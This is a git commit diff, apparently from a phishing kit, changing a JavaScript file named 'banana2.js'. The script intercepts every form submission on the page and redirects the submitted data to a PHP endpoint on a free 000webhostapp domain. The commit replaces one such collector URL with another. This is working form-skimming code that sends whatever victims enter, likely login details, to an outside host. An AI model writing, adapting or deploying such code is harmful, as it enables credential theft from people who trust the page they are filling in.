b4702e73f72b9488bb4ad6e2166ad241a872e095
controlusersverifi <167236927+controlusersverifi@users.noreply.github.com>
2024-04-17 00:41:00 +0700

    Update banana2.js

--- bussines/jonsbo/cupboard/banana2.js
+++ bussines/jonsbo/cupboard/banana2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://give-hepeng-godang.000webhostapp.com/jozz/wi.php");
+  $(myform).attr("action", "https://sakikpalo-awakdah.000webhostapp.com/jozzz/xi.php");
 });
